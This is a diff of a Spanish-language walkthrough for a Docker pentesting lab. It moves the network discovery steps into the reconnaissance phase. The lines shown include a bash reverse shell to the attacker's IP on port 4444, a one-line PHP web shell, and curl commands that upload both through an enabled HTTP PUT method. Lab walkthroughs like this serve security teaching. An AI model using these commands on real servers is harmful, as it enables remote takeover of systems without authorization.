@@ -34,7 +34,7 @@ ssh -p 2222 -N -L 8080:web-machine:80 dummy@localhost
 ---
 
 ## 🔎 FASE 1: Reconocimiento (Enumeración)
-A partir de este punto, operamos desde la terminal de la máquina atacante (Pivote). Docker resuelve el nombre de host web-machine automáticamente, lo que nos permite dirigir los ataques sin necesidad de averiguar la IP dinámica de la víctima.
+A partir de este punto, operamos desde la terminal de la máquina atacante (Pivote).
 Para completar el ataque se requieren **dos terminales abiertas** en la máquina atacante:
 
 - **Terminal 1** 🧨: usada para reconocimiento y explotación (peticiones web, subida de ficheros).
@@ -43,6 +43,19 @@ Para completar el ataque se requieren **dos terminales abiertas** en la máquina
 El primer paso es identificar qué servicios están expuestos en la máquina objetivo y analizar su configuración. Dado que actuamos en modo "caja negra" (sin conocer la infraestructura), comenzamos con un escaneo general.
 
 ### 1. Escaneo de Puertos
+1. Se identifica la dirección IP de la máquina atacante y víctima, que actuará como destino de la conexión inversa.
+```bash
+ip addr show eth0
+```
+Copia tu IP obtenida e introdúcela donde veas TU_IP.
+
+Una vez conocemos nuestra IP hacemos un escaneo por la red de la IP para ver qué otras máquinas están conectadas.
+Por ejemplo, si tu IP es la 172.21.0.3/16, haremos un escaneo por la subred 172.21.0.0/16
+```bash
+nmap -sn TU_SURBED
+```
+Copia la IP obtenida e introdúcela donde veas VICTIM_IP.
+
 Ejecutamos `nmap` contra la IP objetivo para descubrir puertos abiertos y versiones de servicios.
 
 ```bash
@@ -73,28 +86,15 @@ curl -v -X OPTIONS http://localhost:8080/test/
 ## 🔓 FASE 2: Acceso Inicial (Reverse Shell)
 Confirmada la vulnerabilidad, se procede a obtener acceso remoto al sistema.
 
-1. Se identifica la dirección IP de la máquina atacante y víctima, que actuará como destino de la conexión inversa.
-```bash
-ip addr show eth0
-```
-Copia tu IP obtenida e introdúcela donde veas TU_IP.
-
-Una vez conocemos nuestra IP hacemos un escaneo por la red de la IP para ver qué otras máquinas están conectadas.
-Por ejemplo, si tu IP es la 172.21.0.3/16, haremos un escaneo por la subred 172.21.0.0/16
-```bash
-nmap -sn TU_SURBED
-```
-Copia la IP obtenida e introdúcela donde veas VICTIM_IP.
-
-2. Se prepara un payload que fuerza al servidor a iniciar una **reverse shell**.
+1. Se prepara un payload que fuerza al servidor a iniciar una **reverse shell**.
 ```bash
 echo "bash -i >& /dev/tcp/TU_IP/4444 0>&1" > rev.sh
 ```
-3. Se crea un archivo PHP que permite ejecutar acciones en el servidor a través de peticiones web.
+2. Se crea un archivo PHP que permite ejecutar acciones en el servidor a través de peticiones web.
 ```bash
 echo '<?php system($_GET["cmd"]); ?>' > shell.php
 ```
-4. Ambos archivos se suben al directorio vulnerable `/test/` aprovechando el método PUT.
+3. Ambos archivos se suben al directorio vulnerable `/test/` aprovechando el método PUT.
 ```bash
 curl -v -T rev.sh http://VICTIM_IP/test/rev.sh
 curl -v -T shell.php http://VICTIM_IP/test/shell.php
